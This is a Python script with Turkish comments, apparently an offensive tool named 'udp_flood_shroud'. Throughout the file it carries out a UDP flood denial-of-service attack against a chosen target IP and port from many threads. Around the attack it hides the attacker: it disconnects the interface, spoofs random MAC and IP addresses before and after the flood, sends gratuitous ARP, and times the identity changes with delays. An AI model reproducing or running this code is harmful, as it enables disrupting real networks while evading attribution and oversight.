#!/usr/bin/env python3
# attack/udp_flood_shroud.py

import argparse
import random
import socket
import threading
import time
import signal
import sys
import subprocess
import ipaddress

stop_event = threading.Event()

def run(cmd):
    subprocess.run(cmd, check=True,
                   stdout=subprocess.DEVNULL,
                   stderr=subprocess.DEVNULL)

def get_iface_info(iface):
    mac = subprocess.check_output(
        ["cat", f"/sys/class/net/{iface}/address"]
    ).decode().strip()
    out = subprocess.check_output(
        ["ip","-4","-o","addr","show","dev",iface]
    ).decode().split()
    ip_pref = out[out.index("inet")+1]  # "192.168.1.10/24"
    ip, prefix = ip_pref.split("/")
    return mac, ip, int(prefix)

def random_mac():
    b = random.randrange(0,256) & 0b11111100 | 0b00000010
    return ":".join(f"{b if i==0 else random.randrange(0,256):02x}" for i in range(6))

def random_ip(cidr, exclude):
    net = ipaddress.ip_network(cidr, strict=False)
    hosts = [str(h) for h in net.hosts() if str(h) not in exclude]
    return random.choice(hosts)

def disconnect_iface(iface):
    try:
        run(["sudo","iw","dev",iface,"disconnect"])
    except subprocess.CalledProcessError:
        print(f"[!] Could not disconnect {iface} (belki zaten ayrılmıştı). Devam ediliyor.")

def set_iface_mac(iface, mac):
    run(["sudo","ip","link","set","dev",iface,"down"])
    run(["sudo","ip","link","set","dev",iface,"address",mac])
    run(["sudo","ip","link","set","dev",iface,"up"])

def set_iface_ip(iface, ip, prefix):
    run(["sudo","ip","addr","flush","dev",iface])
    run(["sudo","ip","addr","add",f"{ip}/{prefix}","dev",iface])

def gratuitous_arp(iface, ip):
    try:
        run(["sudo","arping","-U","-c","3","-I",iface,ip])
    except subprocess.CalledProcessError:
        print(f"[!] Gratuitous ARP atılamadı for {ip}. Devam ediliyor.")

def udp_worker(target, port, size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(size)
    sent = 0
    while not stop_event.is_set():
        sock.sendto(payload, (target, port))
        sent += 1
        if sent % 1000 == 0:
            print(f"[UDP] {sent} paket gönderildi")

def main():
    p = argparse.ArgumentParser("UDP Flood + MAC/IP Shroud w/ Delays")
    p.add_argument("--iface", required=True, help="örn. wlan0")
    p.add_argument("target", help="Hedef IP")
    p.add_argument("-p","--port",   type=int, default=53,  help="Hedef port")
    p.add_argument("-s","--size",   type=int, default=1024,help="Payload boyutu (byte)")
    p.add_argument("-t","--threads",type=int, default=4,   help="Thread sayısı")
    p.add_argument("-d","--timeout",type=int, default=None,
                   help="Flood süresi (saniye). Belirtilmezse Ctrl+C ile durdurulur.")
    args = p.parse_args()

    # --- A: Orijinal kimlik ---
    orig_mac, orig_ip, prefix = get_iface_info(args.iface)
    cidr = f"{orig_ip}/{prefix}"
    print(f"=== A (Original) ===\n MAC: {orig_mac}\n IP : {orig_ip}/{prefix}\n")

    # --- A ayrılıyor, 142s bekle ---
    disconnect_iface(args.iface)
    print(f"[*] A→B arası 142s bekleniyor ({time.strftime('%H:%M:%S')})")
    time.sleep(142)

    # --- B: Pre-Attack spoof ---
    mac_b = random_mac()
    ip_b  = random_ip(cidr, exclude={orig_ip})
    set_iface_mac(args.iface, mac_b)
    set_iface_ip(args.iface, ip_b, prefix)
    gratuitous_arp(args.iface, ip_b)
    print(f"=== B (Pre-Attack) ===\n MAC: {mac_b}\n IP : {ip_b}/{prefix}\n")

    # --- UDP Flood ---
    signal.signal(signal.SIGINT, lambda *a: stop_event.set())
    print(f"[+] Flood {args.target}:{args.port} başlıyor")
    for _ in range(args.threads):
        t = threading.Thread(target=udp_worker,
                             args=(args.target, args.port, args.size),
                             daemon=True)
        t.start()

    if args.timeout:
        # Belirtilen süre kadar flood, sonra otomatik dur
        time.sleep(args.timeout)
        stop_event.set()
    else:
        # Manuel Ctrl+C bekle
        while not stop_event.is_set():
            time.sleep(0.5)

    print("\n[!] Flood durduruluyor\n")

    # --- C: Post-Attack spoof ---
    mac_c = random_mac()
    ip_c  = random_ip(cidr, exclude={orig_ip, ip_b})
    set_iface_mac(args.iface, mac_c)
    set_iface_ip(args.iface, ip_c, prefix)
    gratuitous_arp(args.iface, ip_c)
    print(f"=== C (Post-Attack) ===\n MAC: {mac_c}\n IP : {ip_c}/{prefix}\n")

    # --- C→D arası 5m23s bekle ---
    wait = 5*60 + 23
    print(f"[*] C→D arası {wait}s bekleniyor ({time.strftime('%H:%M:%S')})")
    time.sleep(wait)

    # --- D: Cleanup spoof ---
    mac_d = random_mac()
    set_iface_mac(args.iface, mac_d)
    print(f"=== D (Cleanup) ===\n MAC: {mac_d}\n (DHCP’ya dön ya da manuel reconnect yapın)\n")

    sys.exit(0)

if __name__=="__main__":
    main()
